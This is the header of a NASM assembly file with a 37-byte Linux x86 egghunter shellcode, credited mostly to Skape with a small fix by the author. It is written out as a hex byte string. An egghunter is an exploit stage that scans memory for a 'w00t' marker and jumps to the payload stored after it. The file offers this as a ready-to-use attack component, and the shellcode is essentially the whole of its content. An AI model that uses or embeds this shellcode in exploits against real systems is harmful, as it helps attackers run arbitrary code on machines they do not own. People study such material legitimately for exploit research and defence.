; Filename: egghunter.nasm
; Author:   Re4son <re4son[at]whitedome.com.au>
;           98% Skape's shellcode - I just cleared ecx on
;           startup as it causes SIGSEGV and me not getting any sleep
;
; Purpose: Linux x86 egghunter using revised access(2) approach
;          37 Bytes
;
;"\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
